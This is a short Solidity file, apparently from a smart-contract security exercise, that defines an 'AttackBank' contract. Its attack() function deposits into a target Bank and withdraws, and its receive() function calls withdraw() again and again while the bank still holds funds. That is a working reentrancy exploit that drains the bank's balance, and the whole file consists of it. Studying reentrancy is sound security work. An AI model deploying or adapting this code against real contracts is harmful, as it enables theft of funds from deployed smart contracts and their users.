//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import {Bank} from "./Bank.sol";

contract AttackBank {
    //IBank public immutable bankContract;
    Bank public bankContract;

    constructor(address bankContractAddr) {
        bankContract = Bank(bankContractAddr);
    }

    function attack() public payable {
        bankContract.deposit{value: msg.value}();
        bankContract.withdraw();
    }

    receive() external payable {
        if (address(bankContract).balance > 0) {
            bankContract.withdraw();
        } else {
            //payable(owner()).transfer(address(this).balance);
        }
    }
}
